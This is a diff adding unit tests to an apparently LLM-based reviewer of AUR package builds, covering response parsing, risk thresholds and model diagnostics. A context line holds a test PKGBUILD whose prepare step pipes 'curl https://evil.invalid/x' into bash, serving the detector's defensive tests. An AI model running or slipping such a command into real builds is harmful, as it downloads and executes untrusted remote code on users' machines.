@@ -10,6 +10,7 @@ import tempfile
 import unittest
 import sys
 from pathlib import Path
+from unittest.mock import patch
 
 ROOT = Path(__file__).resolve().parent
 SCRIPT = ROOT / "yay-llm-review"
@@ -47,6 +48,21 @@ class ReviewTests(unittest.TestCase):
         parsed = module.parse_json_content("```json\n" + json.dumps(review) + "\n```")
         self.assertEqual(module.validate_review(parsed)["risk_level"], "safe")
 
+    def test_model_non_json_error_includes_response_preview(self) -> None:
+        with self.assertRaisesRegex(module.ReviewError, "JSON object.*starts 'I cannot"):
+            module.parse_json_content("I cannot provide the requested JSON response.")
+
+    def test_incomplete_model_json_error_includes_start_and_end(self) -> None:
+        with self.assertRaisesRegex(module.ReviewError, "incomplete JSON.*starts.*ends"):
+            module.parse_json_content('{"risk_level": "high"')
+
+    def test_response_finish_reason(self) -> None:
+        self.assertEqual(
+            module.response_finish_reason({"choices": [{"finish_reason": "length"}]}),
+            "length",
+        )
+        self.assertIsNone(module.response_finish_reason({"choices": [{}]}))
+
     def test_status_threshold(self) -> None:
         config = module.merge_config({"block_threshold": "high"})
         base = {
@@ -58,6 +74,9 @@ class ReviewTests(unittest.TestCase):
         self.assertEqual(module.status_from_review({**base, "risk_level": "medium"}, config), "WARN")
         self.assertEqual(module.status_from_review({**base, "risk_level": "high"}, config), "BLOCK")
         self.assertEqual(module.status_from_review({**base, "risk_level": "uncertain"}, config), "WARN")
+
+    def test_default_max_tokens_allows_detailed_model_reviews(self) -> None:
+        self.assertEqual(module.merge_config({})["max_tokens"], 4096)
 
     def test_static_pipe_to_shell(self) -> None:
         files = (module.PackageFile("PKGBUILD", "prepare() { curl https://evil.invalid/x | bash; }"),)
@@ -87,6 +106,51 @@ class ReviewTests(unittest.TestCase):
             init_lua = Path(env["XDG_CONFIG_HOME"]) / "yay" / "init.lua"
             content = init_lua.read_text(encoding="utf-8")
             self.assertEqual(content.count(module.MANAGED_BEGIN), 1)
+
+    def test_model_diagnostics_check_benign_and_suspicious_recipes(self) -> None:
+        config = module.merge_config({"model": "test-model"})
+        benign_review = {
+            "risk_level": "low",
+            "confidence": 0.9,
+            "summary": "Normal package build.",
+            "recommended_action": "allow",
+            "findings": [],
+        }
+        suspicious_review = {
+            "risk_level": "low",
+            "confidence": 0.9,
+            "summary": "Suspicious package build.",
+            "recommended_action": "allow",
+            "findings": [],
+        }
+        reviews = [benign_review] + [suspicious_review] * (len(module.DIAGNOSTIC_CASES) - 1)
+
+        with patch.object(module, "call_model", side_effect=reviews) as call_model:
+            results = module.run_model_diagnostics(config)
+
+        self.assertEqual(len(results), len(module.DIAGNOSTIC_CASES))
+        self.assertTrue(all(result.passed for result in results))
+        self.assertEqual(call_model.call_count, len(module.DIAGNOSTIC_CASES))
+
+    def test_model_diagnostics_reject_an_allowed_suspicious_recipe(self) -> None:
+        config = module.merge_config({"model": "test-model"})
+        allowed_review = {
+            "risk_level": "safe",
+            "confidence": 0.9,
+            "summary": "No issues.",
+            "recommended_action": "allow",
+            "findings": [],
+        }
+
+        with patch.object(module, "call_model", return_value=allowed_review):
+            results = module.run_model_diagnostics(config)
+
+        self.assertTrue(results[0].passed)
+        self.assertFalse(all(result.passed for result in results[1:]))
+
+    def test_test_command_accepts_verbose(self) -> None:
+        args = module.build_parser().parse_args(["test", "--verbose"])
+        self.assertTrue(args.verbose)
 
 
 if __name__ == "__main__":
